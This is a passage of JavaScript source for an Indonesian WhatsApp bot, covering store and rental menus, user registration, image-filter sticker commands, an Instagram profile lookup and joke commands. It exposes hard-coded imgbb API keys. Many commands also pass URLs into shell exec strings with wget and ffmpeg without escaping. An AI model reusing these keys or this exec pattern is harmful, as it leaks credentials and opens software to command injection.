 buttonText: 'LIST STORE',
 footerText: '*_© Xavhier ゑ_*',
 description: `Ohayoo @${stod.split('@')[0]}, Silahkan Mau Beli Apa Kak...`,
 sections: [
                     {
                      "title": `SILAKAN PILIH SALAH SATU COMMAND DIBAWAH`,
 rows: [
                          {
                              "title": "SEWABOT",
                              "description": 'CLICK HERE FOR BUY',
                              "rowId": ""
                            
                           },
                              {
                              "title": "JASA INSTALL BOT HEROKU",
                              "description": 'CREATE A BOT',
                              "rowId": ""
                            
                           },
                           {
                              "title": "OWNER BOT",
                              "description": 'OWNER BOT',
                              "rowId": ""
                            
                           }
                           
                           
                        ]
                     }],
 listType: 1
}
Fan.sendMessage(from, listMsg, MessageType.listMessage, {contextInfo: { mentionedJid: [stod]},quoted:ftrol})
break
case 'sewabot':
case 'jasasewa':

        if(menusimpel == false){               
                const timestampi = speed();
					const latensyi = speed() - timestampi
                
				runtime = process.uptime()
				
                nomor = 1
                stod = `${sender}`
       stst = await Fan.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
				
       
       menu = ` 𝗢𝗣𝗘𝗡 𝗦𝗘𝗪𝗔𝗕𝗢𝗧
 _*© Xavhier ゑ*_

ＦＩＴＵＲ:
ᴛᴏᴛᴀʟ ꜰɪᴛᴜʀ:500+

ＭＥＮＹＥＤＩＡＫＡＮ
ＦＩＴＵＲ
- ＡＮＴＩＬＩＮＫ
-ＡＮＴＩＶＩＲＴＥＸ
-ＡＮＴＩ ＷＡ.ＭＥ
-ＷＥＬＣＯＭＥ
-ＬＥＡＶＥ

ＤＡＮ ＢＡＮＹＡＫ ＬＡＧＩ


ＰＲＩＣＥＬＩＳＴ ＨＡＲＧＡ：

 10k : 1 bulan
 20k : permanen


MINAT KLIK ORDER

 `
sendButLocation(from, `${menu}`, "*STORE MENU*", {jpegThumbnail:store1,name:""}, [{buttonId:`order`,buttonText:{displayText:'CLICK HERE FOR ORDER'},type:1}], {contextInfo: { mentionedJid: [dtod,otod,stod]}})
}
else if(menusimpel = true){
        stod = `${sender}`
fill =`Ohayoo ${pushname}, ${tampilUcapan}
Silahkan Pilih Untuk Menampilkan Menu

Jika Button Tidak Muncul Ketik .allmenu`
menu =` Xavhier ゑ`
gbutsan = [
{buttonId:`allmenu`,buttonText:{displayText:'SHOW MENU'},type:1},
{buttonId:`store`,buttonText:{displayText:'STORE MENU'},type:1},
{buttonId:`script`,buttonText:{displayText:'SEWABOT'},type:1}
]
mhan = await Fan.prepareMessage(from, ofrply, image, {thumbnail: ofrply})
const btnmenu = {
imageMessage: mhan.message.imageMessage,
contentText: `${fill}`,
footerText: `${menu}`,
buttons: gbutsan,
headerType: 4
}
Fan.sendMessage(from, btnmenu, MessageType.buttonsMessage, {contextInfo :{text: 'hi',
"forwardingScore": 1000000000,
isForwarded: false,
sendEphemeral: false,
"externalAdreply": {
"title": `hallo ${pushname}` ,
"body": `${jmn} - ${week} ${weton} - ${calender}`,
"mediaType": "2",
"thumbnail": pporigi,
},mentionedJid:[stod]}, quoted : ftrol})
}
break        
case 'jasa':

        if(menusimpel == false){               
                const timestampi = speed();
					const latensyi = speed() - timestampi
                
				runtime = process.uptime()
				
                nomor = 1
                stod = `${sender}`
       stst = await Fan.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
				
       
       menu = ` 𝙅𝘼𝙎𝘼 𝙄𝙉𝙎𝙏𝘼𝙇𝙇 𝘽𝙊𝙏
_© Xavhier ゑ_

*FanX7 Menyediakan Jasa Install Bot*
_platform heroku_

PAKET 1 = １５ｋ ＋ ｓｃ（ｅｎｃ）

PAKET 2 = ４０ｋ ＋ ｓｃ（ｎｏ ｅｎｃ）

ᴇɴᴄ : ᴀᴅᴀ ʙᴇʙᴇʀᴀᴘᴀ ʏᴀɴɢ ᴛɪᴅᴀᴋ ʙɪꜱᴀ ᴅɪᴜʙᴀʜ ᴄᴏɴᴛᴏʜ ɴᴀᴍᴀ ʙᴏᴛ ɢᴄ ʙᴏᴛ ᴅᴏɴᴀꜱɪ ʙᴏᴛ ᴅʟʟ

ɴᴏ ᴇɴᴄ : ꜰᴜʟʟ ʙɪꜱᴀ ᴅɪᴜʙᴀʜ

MINAT KLIK ORDER

 `
sendButLocation(from, `${menu}`, "*STORE MENU*", {jpegThumbnail:store1,name:""}, [{buttonId:`order`,buttonText:{displayText:'CLICK HERE FOR ORDER'},type:1}], {contextInfo: { mentionedJid: [dtod,otod,stod]}})
}
else if(menusimpel = true){
        stod = `${sender}`
fill =`Ohayoo ${pushname}, ${tampilUcapan}
Silahkan Pilih Untuk Menampilkan Menu

Jika Button Tidak Muncul Ketik .allmenu`
menu =` Xavhier ゑ`
gbutsan = [
{buttonId:`allmenu`,buttonText:{displayText:'SHOW MENU'},type:1},
{buttonId:`store`,buttonText:{displayText:'STORE MENU'},type:1},
{buttonId:`script`,buttonText:{displayText:'SEWABOT'},type:1}
]
mhan = await Fan.prepareMessage(from, ofrply, image, {thumbnail: ofrply})
const btnmenu = {
imageMessage: mhan.message.imageMessage,
contentText: `${fill}`,
footerText: `${menu}`,
buttons: gbutsan,
headerType: 4
}
Fan.sendMessage(from, btnmenu, MessageType.buttonsMessage, {contextInfo :{text: 'hi',
"forwardingScore": 1000000000,
isForwarded: false,
sendEphemeral: false,
"externalAdreply": {
"title": `hallo ${pushname}` ,
"body": `${jmn} - ${week} ${weton} - ${calender}`,
"mediaType": "2",
"thumbnail": pporigi,
},mentionedJid:[stod]}, quoted : ftrol})
}
break        
case 'verify':
case 'daftar':
if (isRegistered) return reply(`Ok Om`)
const serialUser = createSerial(18)
	        veri = sender
	        _registered.push(sender)
	        fs.writeFileSync('./P2/registered.json', JSON.stringify(_registered))
	        addRegisteredUser(sender, serialUser)
	         const jancok = `╭─❒ 「 Verify 」 ❒
 * Nama :* ${pushname}
 * Nomor :* @${sender.split('@')[0]}
 * Seri:* ${serialUser}
 * Pengguna:* ${_registered.length}
└❏

JANGAN LUPA JOIN GC : https://chat.whatsapp.com/K8V89lh8XFDBgkkZxa59tw
*「 Xavhier ゑ 」*`
gbutsan = [
{buttonId:`menu`,buttonText:{displayText:'MENU'},type:1},
{buttonId:`donasi`,buttonText:{displayText:'DONASI'},type:1}
]
mhan = await Fan.prepareMessage(from, ofrply, image, {thumbnail: ofrply})
const sendBtnVeryy = {
imageMessage: mhan.message.imageMessage,
contentText:`${jancok}`,
footerText:'Terimakasih Sudah Mendaftar\nFanX7', 
buttons: gbutsan,
headerType: 4
}
Fan.sendMessage(from, sendBtnVeryy, MessageType.buttonsMessage, {quoted:ftrol, contextInfo: { mentionedJid: [sender]}})
	         console.log(color('[REGISTER]'), color(time, 'yellow'), 'Serial:', color(serialUser, 'cyan'), 'in', color(sender || groupName))
	    // console.log(e)
        break
// BIAR GAK LUPA 
//LUPA
case 'nulis':

if (!c) return reply('Textnya mana gan?')
teks = body.slice(7)
reply(`OTW TULIS BOSS`)
kon = (`https://api.lolhuman.xyz/api/nulis?apikey=${lolkey}&text=${c}`)
anu = await getBuffer(kon)
Fan.sendMessage(from, anu, image, { quoted: mek, thumbnail: fs.readFileSync('./P3/image/logonya.jpeg')})
break

    


//🐀💰 MALING
                   case 'trigger':

					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					reply(`Bentar Nyett....`)
					console.log(color(time, 'magenta'), color('Downloading sticker...'))
					owgi = await  Fan.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu1 = `https://some-random-api.ml/canvas/triggered?avatar=${teks}`
					exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					Fan.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
					fs.unlinkSync(rano)
					})
					} else {
					reply('Gunakan foto!')
					}
					break
					case 'sampah':

					var imgbb = require('imgbb-uploader')
	                 if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	                 ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
	                 owgi = await Fan.downloadAndSaveMediaMessage(ger)
	                 let aanu = await imgbb("55e7971b786836b9966eca4528210ba8", owgi)
	                let teks = `${aanu.display_url}`
                    titid = await fetchJson(`https://nekobot.xyz/api/imagegen?type=trash&url=${teks}`, {method: 'get'})
                    buffer = await getBuffer(titid.message)
					Fan.sendMessage(from, buffer, image, {quoted: mek})
                   }
              break       
		case 'gay':

					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					reply(`Bentar Nyett....`)
					console.log(color(time, 'magenta'), color('Downloading sticker...'))
					owgi = await  Fan.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu1 = `https://some-random-api.ml/canvas/gay?avatar=${teks}`
					exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					Fan.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
					console.log(color(time, 'magenta'), color('Succes send sticker...'))
					fs.unlinkSync(rano)
					})
					} else {
					reply('Gunakan foto!')
					}
					break
		case 'glass':

					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					reply(`Bentar Nyett....`)
					console.log(color(time, 'magenta'), color('Downloading sticker...'))
					owgi = await  Fan.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu1 = `https://some-random-api.ml/canvas/glass?avatar=${teks}`
					exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					Fan.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
					console.log(color(time, 'magenta'), color('Succes send sticker...'))
					fs.unlinkSync(rano)
					})
					} else {
					reply('Gunakan foto!')
					}
					break
		case 'passed':

					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					reply(`Bentar Nyett....`)
					console.log(color(time, 'magenta'), color('Downloading sticker...'))
					owgi = await  Fan.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu1 = `https://some-random-api.ml/canvas/passed?avatar=${teks}`
					exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					Fan.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
					console.log(color(time, 'magenta'), color('Succes send sticker...'))
					fs.unlinkSync(rano)
					})
					} else {
					reply('Gunakan foto!')
					}
					break
		case 'jail':

					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					reply(`Bentar Nyett....`)
					console.log(color(time, 'magenta'), color('Downloading sticker...'))
					owgi = await  Fan.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu1 = `https://some-random-api.ml/canvas/jail?avatar=${teks}`
					exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					Fan.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
					console.log(color(time, 'magenta'), color('Succes send sticker...'))
					fs.unlinkSync(rano)
					})
					} else {
					reply('Gunakan foto!')
					}
					break
		case 'comrade':

					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					reply(`Bentar Nyett....`)
					console.log(color(time, 'magenta'), color('Downloading sticker...'))
					owgi = await  Fan.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu1 = `https://some-random-api.ml/canvas/comrade?avatar=${teks}`
					exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					Fan.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
					console.log(color(time, 'magenta'), color('Succes send sticker...'))
					fs.unlinkSync(rano)
					})
					} else {
					reply('Gunakan foto!')
					}
					break
		case 'hijau':

					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					reply(`Bentar Nyett....`)
					console.log(color(time, 'magenta'), color('Downloading sticker...'))
					owgi = await  Fan.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu6 = `https://some-random-api.ml/canvas/green?avatar=${teks}`
					exec(`wget ${anu6} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					Fan.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
					console.log(color(time, 'magenta'), color('Succes send sticker...'))
					fs.unlinkSync(rano)
					
					})
					} else {
					reply('Gunakan foto!')
					}
					break 
		case 'biru':

					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					reply(`Bentar Nyett....`)
					console.log(color(time, 'magenta'), color('Downloading sticker...'))
					owgi = await  Fan.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu7 = `https://some-random-api.ml/canvas/blue?avatar=${teks}`
					exec(`wget ${anu7} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					Fan.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
					console.log(color(time, 'magenta'), color('Succes send sticker...'))
					fs.unlinkSync(rano)
					})
					
					} else {
					reply('Gunakan foto!')
					}
					 break 
		case 'greyscale':

					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					reply(`Bentar Nyett....`)
					console.log(color(time, 'magenta'), color('Downloading sticker...'))
					owgi = await  Fan.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu8 = `https://some-random-api.ml/canvas/greyscale?avatar=${teks}`
					exec(`wget ${anu8} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					Fan.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
					console.log(color(time, 'magenta'), color('Succes send sticker...'))
					fs.unlinkSync(rano)
					})
					
					} else {
					reply('Gunakan foto!')
					}
				 break 
		case 'invert':

					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					reply(`Bentar Nyett....`)
					console.log(color(time, 'magenta'), color('Downloading sticker...'))
					owgi = await  Fan.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu8 = `https://some-random-api.ml/canvas/invert?avatar=${teks}`
					exec(`wget ${anu8} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					Fan.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
					console.log(color(time, 'magenta'), color('Succes send sticker...'))
					fs.unlinkSync(rano)
					})
					
					} else {
					reply('Gunakan foto!')
					}
				 break 
		case 'invert_greyscale':

					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					reply(`Bentar Nyett....`)
					console.log(color(time, 'magenta'), color('Downloading sticker...'))
					owgi = await  Fan.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu8 = `https://some-random-api.ml/canvas/invertgreyscale?avatar=${teks}`
					exec(`wget ${anu8} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					Fan.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
					console.log(color(time, 'magenta'), color('Succes send sticker...'))
					fs.unlinkSync(rano)
					})
					
					} else {
					reply('Gunakan foto!')
					}
				 break 
		case 'red':

					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					reply(`Bentar Nyett....`)
					console.log(color(time, 'magenta'), color('Downloading sticker...'))
					owgi = await  Fan.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu8 = `https://some-random-api.ml/canvas/red?avatar=${teks}`
					exec(`wget ${anu8} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					Fan.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
					console.log(color(time, 'magenta'), color('Succes send sticker...'))
					fs.unlinkSync(rano)
					})
					
					} else {
					reply('Gunakan foto!')
					}
				 break
         case 'blurple':

					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					reply(`Bentar Nyett....`)
					console.log(color(time, 'magenta'), color('Downloading sticker...'))
					owgi = await  Fan.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu8 = `https://some-random-api.ml/canvas/blurple?avatar=${teks}`
					exec(`wget ${anu8} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					Fan.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
					console.log(color(time, 'magenta'), color('Succes send sticker...'))
					fs.unlinkSync(rano)
					})
					
					} else {
					reply('Gunakan foto!')
					}
				 break 
		case 'blurple2':

					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					reply(`Bentar Nyett....`)
					console.log(color(time, 'magenta'), color('Downloading sticker...'))
					owgi = await  Fan.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu8 = `https://some-random-api.ml/canvas/blurple2?avatar=${teks}`
					exec(`wget ${anu8} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					Fan.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
					console.log(color(time, 'magenta'), color('Succes send sticker...'))
					fs.unlinkSync(rano)
					})
					
					} else {
					reply('Gunakan foto!')
					}
				 break 
		case 'wasted':

					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					reply(`Bentar Nyett....`)
					owgi = await  Fan.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu2 = `https://some-random-api.ml/canvas/wasted?avatar=${teks}`
					exec(`wget ${anu2} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					Fan.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
					fs.unlinkSync(rano)
					})
					
					} else {
					reply('Gunakan foto!')
					}
					break 
		case 'pelangi':
		case 'rainbow':

					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					reply(`Bentar Nyett....`)
					owgi = await  Fan.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu3 = `https://some-random-api.ml/canvas/gay?avatar=${teks}`
					exec(`wget ${anu3} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					Fan.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
					fs.unlinkSync(rano)
					})
					
					} else {
					reply('Gunakan foto!')
					}
					break 
		case 'sepia':

					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					reply(`Bentar Nyett....`)
					owgi = await  Fan.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu4 = `https://some-random-api.ml/canvas/sepia?avatar=${teks}`
					exec(`wget ${anu4} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					Fan.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
					fs.unlinkSync(rano)
					})
					
					} else {
					reply('Gunakan foto!')
					}
					break 
					//Fun not faedah
               case 'brainly':

					if (args.length < 1) return reply('Pertanyaan apa')
		          	brien = args.join(' ')
					brainly(`${brien}`).then(res => {
					teks = '❉───────────────────────❉\n'
					for (let Y of res.data) {
					teks += `\n*「 _BRAINLY_ 」*\n\n*➸ Pertanyaan:* ${Y.pertanyaan}\n\n*➸ Jawaban:* ${Y.jawaban[0].text}\n❉──────────────────❉\n`
					}
					Fan.sendMessage(from, teks, text,{quoted:mek,detectLinks: false})                        
		            })              
					break
case 'igstalk':

try{
if (!c) return reply('Usernamenya?')
ig.fetchUser(`${args.join(' ')}`).then(Y => {
console.log(`${args.join(' ')}`)
ten = `${Y.profile_pic_url_hd}`
teks = `*ID* : ${Y.profile_id}\n*Username* : ${args.join('')}\n*Full Name* : ${Y.full_name}\n*Bio* : ${Y.biography}\n*Followers* : ${Y.following}\n*Following* : ${Y.followers}\n*Private* : ${Y.is_private}\n*Verified* : ${Y.is_verified}\n\n*Link* : https://instagram.com/${args.join('')}`
sendMediaURL(from,ten,teks) 
})} catch {
const tod = await fetchJson(
`https://ferdiz-afk.my.id/api/stalkig?username=${c}`
);
var nih_buff = await getBuffer(tod.picurl);
const tt = `*INSTAGRAM STALK*

\nUsername: ${tod.username}\nFullname: ${tod.fullname}\npostingan: ${tod.post}\ncategory_akun: ${tod.category_name}\nverified: ${tod.verified_user}\nprivate: ${tod.private_user}\nFollowing: ${tod.following}\nFollower: ${tod.followers}\nBio:\n${tod.bio}`;
Fan.sendMessage(from, nih_buff, image, { quoted: mek, caption: tt });
}
break;      
break    
                case 'bisakah':

					bisakah = body.slice(1)
					const bisa =['Bisa','Tidak Bisa','Coba Ulangi','Ngimpi kah?','yakin bisa?']
					const keh = bisa[Math.floor(Math.random() * bisa.length)]
					Fan.sendMessage(from, 'Pertanyaan : *'+bisakah+'*\n\nJawaban : '+ keh, text, { quoted: mek })
					break
				case 'kapankah':

					kapankah = body.slice(1)
					const kapan =['Besok','Lusa','Tadi','4 Hari Lagi','5 Hari Lagi','6 Hari Lagi','1 Minggu Lagi','2 Minggu Lagi','3 Minggu Lagi','1 Bulan Lagi','2 Bulan Lagi','3 Bulan Lagi','4 Bulan Lagi','5 Bulan Lagi','6 Bulan Lagi','1 Tahun Lagi','2 Tahun Lagi','3 Tahun Lagi','4 Tahun Lagi','5 Tahun Lagi','6 Tahun Lagi','1 Abad lagi','3 Hari Lagi','Tidak Akan Pernah']
					const koh = kapan[Math.floor(Math.random() * kapan.length)]
					Fan.sendMessage(from, 'Pertanyaan : *'+kapankah+'*\n\nJawaban : '+ koh, text, { quoted: mek })
					break
         			  case 'apakah':

					apakah = body.slice(1)
					const apa =['Iya','Tidak','Bisa Jadi','Coba Ulangi','Tanyakan Ayam']
					const kah = apa[Math.floor(Math.random() * apa.length)]
